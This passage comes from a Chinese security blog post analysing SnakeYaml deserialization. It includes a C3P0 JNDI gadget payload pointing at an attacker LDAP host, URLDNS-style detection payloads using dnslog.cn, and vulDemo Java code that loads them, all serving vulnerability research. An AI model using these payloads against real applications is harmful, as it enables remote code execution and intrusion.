+<p>重新打断点跟进，和映射(<code>Mapping</code>)的逻辑有所不同，先来到<code>org.yaml.snakeyaml.constructor.Constructor.ConstructYamlObject#construct</code></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250325083021336.png" alt="image-20250325083021336"></p>
+<p>来到构造函数<code>org.yaml.snakeyaml.constructor.Constructor.ConstructSequence</code>，在<code>for</code>循环中进行递归调用，最后返回的是被赋完值的<code>URLClassLoader</code>对象</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250325083457964.png" alt="image-20250325083457964"></p>
+<h5 id="javax-script-ScriptEngineManager链"><a href="#javax-script-ScriptEngineManager链" class="headerlink" title="javax.script.ScriptEngineManager链"></a>javax.script.ScriptEngineManager链</h5><p>工具项目地址：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<p><code>Java-SPI</code>机制分析：<a target="_blank" rel="noopener" href="https://javaguide.cn/java/basis/spi.html#spi-%E4%BB%8B%E7%BB%8D">https://javaguide.cn/java/basis/spi.html#spi-%E4%BB%8B%E7%BB%8D</a></p>
+<p><code>Payload</code>即上文序列(<code>Sequence</code>)调试的<code>payload</code>，工具利用方法参考<code>README.md</code>文件和文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/17828948.html">https://www.cnblogs.com/LittleHann/p/17828948.html</a></p>
+<h4 id="SnakeYaml-C3P0"><a href="#SnakeYaml-C3P0" class="headerlink" title="SnakeYaml + C3P0"></a>SnakeYaml + C3P0</h4><p>C3P0链分析见 -&gt; <a href="https://kagty1.github.io/2025/03/25/C3P0%E9%93%BE%E5%88%86%E6%9E%90/">https://kagty1.github.io/2025/03/25/C3P0%E9%93%BE%E5%88%86%E6%9E%90/</a></p>
+<h5 id="jndi链"><a href="#jndi链" class="headerlink" title="jndi链"></a>jndi链</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">vulDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource &#123;jndiName: ldap://192.168.43.95:8085/evilRef, loginTimeout: 8&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="Hex流反序化链"><a href="#Hex流反序化链" class="headerlink" title="Hex流反序化链"></a>Hex流反序化链</h5><p>与<code>jndi</code>链同理，构造相似<code>payload</code>即可，原理不做赘述</p>
+<h4 id="探测payload"><a href="#探测payload" class="headerlink" title="探测payload"></a>探测payload</h4><p><code>payload</code>参考：<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/#%E6%8E%A2%E6%B5%8BSnakeYAML">https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/#%E6%8E%A2%E6%B5%8BSnakeYAML</a></p>
+<p><code>URLDNS</code>链参考：<a href="https://kagty1.github.io/2025/02/07/Ysoserial_URLDNS%E9%93%BE%E5%88%86%E6%9E%90/">https://kagty1.github.io/2025/02/07/Ysoserial_URLDNS%E9%93%BE%E5%88%86%E6%9E%90/</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">调用堆栈：</span><br><span class="line">java<span class="selector-class">.lang</span>.Object<span class="selector-id">#hashCode</span></span><br><span class="line">processDuplicateKeys:<span class="number">94</span>, SafeConstructor (org<span class="selector-class">.yaml</span><span class="selector-class">.snakeyaml</span>.constructor)</span><br><span class="line">flattenMapping:<span class="number">76</span>, SafeConstructor (org<span class="selector-class">.yaml</span><span class="selector-class">.snakeyaml</span>.constructor)</span><br><span class="line">constructMapping2ndStep:<span class="number">189</span>, SafeConstructor (org<span class="selector-class">.yaml</span><span class="selector-class">.snakeyaml</span>.constructor)</span><br><span class="line">constructMapping:<span class="number">460</span>, BaseConstructor (org<span class="selector-class">.yaml</span><span class="selector-class">.snakeyaml</span>.constructor)</span><br><span class="line">construct:<span class="number">556</span>, SafeConstructor<span class="variable">$ConstructYamlMap</span> (org<span class="selector-class">.yaml</span><span class="selector-class">.snakeyaml</span>.constructor)</span><br><span class="line">constructObjectNoCheck:<span class="number">229</span>, BaseConstructor (org<span class="selector-class">.yaml</span><span class="selector-class">.snakeyaml</span>.constructor)</span><br><span class="line">constructObject:<span class="number">219</span>, BaseConstructor (org<span class="selector-class">.yaml</span><span class="selector-class">.snakeyaml</span>.constructor)</span><br><span class="line">constructDocument:<span class="number">173</span>, BaseConstructor (org<span class="selector-class">.yaml</span><span class="selector-class">.snakeyaml</span>.constructor)</span><br><span class="line">getSingleData:<span class="number">157</span>, BaseConstructor (org<span class="selector-class">.yaml</span><span class="selector-class">.snakeyaml</span>.constructor)</span><br><span class="line">loadFromReader:<span class="number">490</span>, Yaml (org<span class="selector-class">.yaml</span>.snakeyaml)</span><br><span class="line">load:<span class="number">416</span>, Yaml (org<span class="selector-class">.yaml</span>.snakeyaml)</span><br><span class="line"><span class="selector-tag">main</span>:<span class="number">10</span>, vulDemo</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">(<span class="number">1</span>) !<span class="title">!java.net.URL</span> [<span class="keyword">null</span><span class="punctuation">,</span> \<span class="string">&quot;http://osrwbf.dnslog.cn\&quot;</span>]: <span class="number">1</span></span><br><span class="line">(<span class="number">2</span>) key: [!<span class="title">!java.lang.String</span> []: <span class="number">0</span><span class="punctuation">,</span> !<span class="title">!java.net.URL</span> [<span class="keyword">null</span><span class="punctuation">,</span> \<span class="string">&quot;http://5ydl3f.dnslog.cn\&quot;</span>]: <span class="number">1</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">vulDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;!!java.net.URL [null, \&quot;http://6e8pgb.dnslog.cn\&quot;]: 1&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h4><p>感觉<code>SnakeYaml</code>反序列化的本质依然是对<code>setter</code>方法的调用，所以一些<code>Fastjson</code>的链子在<code>SnakeYaml</code>中也可以打，还是需要慢慢研究。</p>
+
+      </div>
+    </div>
+</div>
+
+<div class="post-category">
+
+    <div id="p-meta-i">
+        
+              
+                <a class="hover-with-bg" href="/categories/SankeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">SankeYaml反序列化漏洞分析</a>
+              
+          
+          
+              
+                <a class="hover-with-bg" href="/tags/SankeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"># SankeYaml反序列化</a>
+              
+          
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span>文章内容是我边学习边记录的，细节可能存在笔误和误解，且部分内容已经过时，仅作学习参考，各位大佬多多谅解</span>
+    <div class="donate-way">
+      
+    </div>
+  </div>
+  
+
+  <div class="post-copyright">
+    <p style="margin: 5px 0;">文章作者：<a target="_blank" rel="noopener" href="http://github.com/KaGty1">KaGty1</a></p>
+    <p style="margin: 5px 0;">文章链接：<a href="http://kagty1.github.io/2025/03/24/SnakeYaml%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://kagty1.github.io/2025/03/24/SnakeYaml%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
+    <p style="margin: 5px 0;">版权声明：本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处，谢谢。</p>
+  </div>
+  
+</div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        <!-- Detalk.js https://detalk.js.org/ -->
+
+    <div id="miracle-comments">
+        <div id="detalk">
+            <div style="width: 100%; text-align: center; display: flex; justify-content: center; align-items: center;">
+                <svg width="30px" height="30px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg"><g><animateTransform attributeName="transform" type="rotate" values="0 33 33;270 33 33" begin="0s" dur="1.4s" fill="freeze" repeatCount="indefinite"></animateTransform>
+                    <circle fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30" stroke-dasharray="187" stroke-dashoffset="610"><animate attributeName="stroke" values="#4285F4;#DE3E35;#F7C223;#1B9A59;#4285F4" begin="0s" dur="5.6s" fill="freeze" repeatCount="indefinite"></animate><animateTransform attributeName="transform" type="rotate" values="0 33 33;135 33 33;450 33 33" begin="0s" dur="1.4s" fill="freeze" repeatCount="indefinite"></animateTransform><animate attributeName="stroke-dashoffset" values="187;46.75;187" begin="0s" dur="1.4s" fill="freeze" repeatCount="indefinite"></animate>
+                </circle></g></svg>
+            </div>
+        </div>
+    </div>
+    <style>
+        .comment-title h3 {
+            font-size: 1.25rem;
+        }
+        .detalk-container .input-label label {
+            width: 30% !important;
+        }
+        .detalk-container .input-data .input-area input {
+            width: 70% !important;
+        }
+    </style>
+    <script>
+        function loadComment() {
+            try {
+                loadScriptFile({
+                    url: "https://cdn.jsdelivr.net/npm/@detalk/static@1.3.1/dist/detalk.js",
+                    loadType: "async",
+                    cb: () => {
+                        detalk.init({"url":"","el":"#detalk","label":{"admin":{"name":"博主","class":"label-green"}},"recaptchaSiteKey":null,"login":{"github":null},"owo":null});
+                    },
+                });
+            } catch (e) {
+                document.getElementById("loadCommentBtn").innerText = "无法加载 Detalk.js 评论";
+                console.info(e);
+            }
+        }
+        function loadDetalk() {
+            try {
+                loadComment();
+            } catch (e) {
+                console.log(e);
+            }
+        }
+        var runningOnBrowser = typeof window !== "undefined";
+
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var observer = new IntersectionObserver(function(entries) {
+                if (entries[0].isIntersecting) {
+                    loadDetalk();
+                    observer.disconnect();
+                }
+                }, { threshold: [0] });
+                observer.observe(document.getElementById('miracle-comments'));
+            } else {
+                loadDetalk();
+            }
+        }, 1);
+    </script>
+
+
+    </div>
+
+</article>
+
+
+        </div>
+        
+<footer class="text-center">
+    
+    
+    
+    
+    
+    <p>&copy;  2025 - &nbsp;&nbsp;知行合一 自强不息</p>
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by <a href="https://github.com/oCoke/hexo-theme-miracle" target="_blank">Miracle</a></p>
+    
+    
+</footer>
+
+<div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
+    
+    
+      <a class="toc-btn" id="share-btn"><i>
+        <svg t="1670124379155" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2683" width="25" height="25"><path d="M395.946667 234.666667v64H256v469.333333h512V522.666667h64V768a64 64 0 0 1-64 64H256a64 64 0 0 1-64-64V298.666667a64 64 0 0 1 64-64h139.946667z m335.850666-87.914667l150.848 150.826667-158.378666 158.4-45.269334-45.248L748.394667 341.333333H672c-121.685333 0-220.714667 97.024-223.914667 217.941334L448 565.333333v85.333334h-64v-85.333334C384 406.272 512.938667 277.333333 672 277.333333h99.861333l-85.312-85.333333 45.248-45.248z" p-id="2684" fill="var(--first-text-color)"></path></svg>
+      </i></a>
+    
+    <a href="javascript:window.scrollTo({top:0,behavior:'smooth'});" class="click-btn">
+      <i id="i-up"></i>
+    </a>
+</div>
+
+<!-- SCRIPTS -->
+
+
+
+
+
+
+<script>
+    document.getElementById("btn-dropdown").addEventListener('click', () => {
+      toggleClass("#dropdown-menus","display-inline");
+    });
+    console.log('\n' + ' %c Powered by Hexo Theme Miracle ' + ' %c https://github.com/oCoke/hexo-theme-miracle ' + '\n' + '\n', 'color: #fff; background: #4F9BFA; padding:5px 0;', 'background: #FFF; padding:5px 0;');
+
+    
+
+    
+  /* 小彩蛋: 饮茶先啦 */
+  setTimeout(() => {
+    var time = new Date();
+    if (time.getHours() == 15) {
+      let comment = document.createComment(' 三点几嚟！饮茶先啦！ ');
+      document.body.insertBefore(comment, document.getElementsByTagName('header')[0]);
+    }
+  },1);
+    
+</script>
+
+
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
+
+
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
+
+
+
+    <script>
+        query("#share-btn")[0].onclick = async () => {
+            let url = `${location.protocol}//${location.hostname}${location.port ? ":"+location.port:location.port}${location.pathname}#read=${sessionStorage.getItem(location.pathname+"_read_y") || ""}`;
+            try {
+                await navigator.clipboard.writeText(url);
+                prompt_core("分享链接已经复制至剪贴板", 4800, true);
+            } catch(e) {
+                prompt_core("分享链接复制失败，请手动复制<br/>"+url, 4800, false);
+            }
+        }
+    </script>
+
+
+
+
+
+    <script>
+        setTimeout(() => {
+            loadScriptFile({
+                url: "//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",
+                loadType: "async"
+            });
+        },0);
+    </script>
+
+
+
+    <script>
+        const getScrollPosition = (el = window) => ({
+            x: el.pageXOffset !== undefined ? el.pageXOffset : el.scrollLeft,
+            y: el.pageYOffset !== undefined ? el.pageYOffset : el.scrollTop
+        });
+        // 此处的 750 是「页面元素的最大宽度」
+        var wx = document.getElementsByClassName("article-m")[0].clientWidth;
+        var wy = document.getElementsByClassName("article-m")[0].clientHeight;
+        function windowScroll() {
+            // 反复修改 确保页面尺寸不改变
+            wx = document.getElementsByClassName("article-m")[0].clientWidth;
+            wy = document.getElementsByClassName("article-m")[0].clientHeight;
+            let y = Math.round(getScrollPosition().y);
+            // console.log(y);
+            // 组合字符串，同时记录页面坐标，页面宽度和高度
+            let p = `${y}:${wx}:${wy}`;
+            // 写入到 sessionStorage 中
+            sessionStorage.setItem(location.pathname + "_read_y", p);
+        }
+        // URL 中是否包含传递的坐标信息
+        setTimeout(() => {
+            if (location.hash.split("#read=").length > 1) {
+                prompt_core("已有阅读进度，正在跳转", 4800, true);
+                // 分离字符串
+                let read_y = location.hash.split("#read=")[1];
+                read_y = read_y.split(":");
+                // 组合乘积，顺滑移动至坐标
+                window.scrollTo({top: Math.round(Number(read_y[0]) * Number(read_y[1] * Number(read_y[2] / wx / wy))), behavior: "smooth"});
+            } else {
+                // 从 sessionStorage 中获取
+                let read_y = sessionStorage.getItem(location.pathname + "_read_y") || "0:0:0";
+                read_y = read_y.split(":");
+                if (read_y[0] != "0") prompt_core("已有阅读进度，正在跳转", 4800, true);
+                window.scrollTo({top: Math.round(Number(read_y[0]) * Number(read_y[1] * Number(read_y[2] / wx / wy))), behavior: "smooth"});
+            }
+        }, 500);
+        window.onscroll = windowScroll;
+    </script>
+
+
+
+
+
+        </div>
+        <div id="css-loading">
+            <h3 class="text-center">加载中...</h3>
+        </div>
+        
+    </body>
+</html>
